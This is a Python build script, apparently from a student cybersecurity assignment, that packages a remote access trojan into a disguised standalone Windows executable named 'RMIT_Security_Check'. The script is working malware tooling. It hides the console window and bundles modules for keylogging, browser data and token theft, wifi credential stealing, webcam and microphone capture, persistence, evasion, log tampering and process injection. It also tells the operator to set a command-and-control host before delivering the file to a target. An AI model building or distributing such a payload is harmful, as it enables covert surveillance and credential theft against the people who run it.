"""
Payload Builder - Packages RAT into deliverable formats
MITRE ATT&CK: T1027.002 (Obfuscated Files: Software Packing)
               T1036.005 (Masquerading: Match Legitimate Name)
EDUCATIONAL PURPOSE ONLY - RMIT Cybersecurity Assignment

Packages the RAT client into a single .exe using PyInstaller.
The output looks like a legitimate application to the end user.

Usage:
    py build_payload.py

Output:
    dist/RMIT_Security_Check.exe   (standalone executable)
"""

import subprocess
import sys
import os
import shutil


# Where our source files are
SOURCE_DIR = os.path.dirname(os.path.abspath(__file__))

# All Python modules the RAT needs at runtime
HIDDEN_IMPORTS = [
    "system_info", "file_recon", "screenshot", "keylogger",
    "crypto_utils", "persistence", "evasion",
    "clipboard_monitor", "browser_data", "privilege_check",
    "wifi_stealer", "token_harvester", "network_recon",
    "lateral_recon", "event_log_tamper",
    "webcam_capture", "microphone_capture", "scheduled_task_persist",
    "usb_monitor", "geolocation", "process_injection_demo",
    "email_harvester", "config",
]

# All data files to bundle alongside the exe
DATA_FILES = [
    "config.py", "system_info.py", "file_recon.py", "screenshot.py",
    "keylogger.py", "crypto_utils.py", "persistence.py", "evasion.py",
    "clipboard_monitor.py", "browser_data.py", "privilege_check.py",
    "wifi_stealer.py", "token_harvester.py", "network_recon.py",
    "lateral_recon.py", "event_log_tamper.py",
    "webcam_capture.py", "microphone_capture.py", "scheduled_task_persist.py",
    "usb_monitor.py", "geolocation.py", "process_injection_demo.py",
    "email_harvester.py",
]

# Output name (masquerading as legitimate software)
OUTPUT_NAME = "RMIT_Security_Check"


def build_exe():
    """
    Build standalone .exe using PyInstaller.

    Flags:
      --onefile     = single .exe (no folder of files)
      --noconsole   = no command prompt window (uses pythonw internally)
      --name        = output filename (masquerading)
      --hidden-import = modules imported dynamically
      --add-data    = bundle Python modules as data files
    """
    print("=" * 55)
    print("  PAYLOAD BUILDER - EDUCATIONAL PURPOSE ONLY")
    print("=" * 55)

    # Check PyInstaller is available
    try:
        import PyInstaller
        print(f"[+] PyInstaller version: {PyInstaller.__version__}")
    except ImportError:
        print("[!] PyInstaller not installed. Run: pip install pyinstaller")
        sys.exit(1)

    # Build the command
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--noconsole",
        f"--name={OUTPUT_NAME}",
        "--clean",
        "--noconfirm",
    ]

    # Add hidden imports
    for imp in HIDDEN_IMPORTS:
        cmd.extend(["--hidden-import", imp])

    # Add data files (bundled inside the exe)
    for data_file in DATA_FILES:
        src_path = os.path.join(SOURCE_DIR, data_file)
        if os.path.exists(src_path):
            # Format: source;destination_folder
            cmd.extend(["--add-data", f"{src_path};."])

    # Entry point
    cmd.append(os.path.join(SOURCE_DIR, "rat_client.py"))

    print(f"\n[*] Building {OUTPUT_NAME}.exe ...")
    print(f"[*] Hidden imports: {len(HIDDEN_IMPORTS)}")
    print(f"[*] Bundled data files: {len(DATA_FILES)}")
    print(f"[*] This will take a minute...\n")

    # Run PyInstaller
    result = subprocess.run(cmd, cwd=SOURCE_DIR)

    if result.returncode == 0:
        exe_path = os.path.join(SOURCE_DIR, "dist", f"{OUTPUT_NAME}.exe")
        if os.path.exists(exe_path):
            size_mb = os.path.getsize(exe_path) / (1024 * 1024)
            print(f"\n{'=' * 55}")
            print(f"  BUILD SUCCESSFUL")
            print(f"{'=' * 55}")
            print(f"  Output: {exe_path}")
            print(f"  Size:   {size_mb:.1f} MB")
            print(f"  Name:   {OUTPUT_NAME}.exe")
            print(f"\n  This .exe can be delivered to the target machine.")
            print(f"  No Python installation needed on the target.")
            print(f"\n  IMPORTANT: Update C2_HOST in config.py BEFORE building!")
        else:
            print("[!] Build completed but .exe not found")
    else:
        print(f"[!] Build failed with return code {result.returncode}")


def clean_build():
    """Remove build artifacts."""
    for folder in ["build", "dist", "__pycache__"]:
        path = os.path.join(SOURCE_DIR, folder)
        if os.path.exists(path):
            shutil.rmtree(path)
            print(f"[+] Removed: {folder}/")

    spec_file = os.path.join(SOURCE_DIR, f"{OUTPUT_NAME}.spec")
    if os.path.exists(spec_file):
        os.remove(spec_file)
        print(f"[+] Removed: {OUTPUT_NAME}.spec")


if __name__ == "__main__":
    if "--clean" in sys.argv:
        clean_build()
    else:
        build_exe()
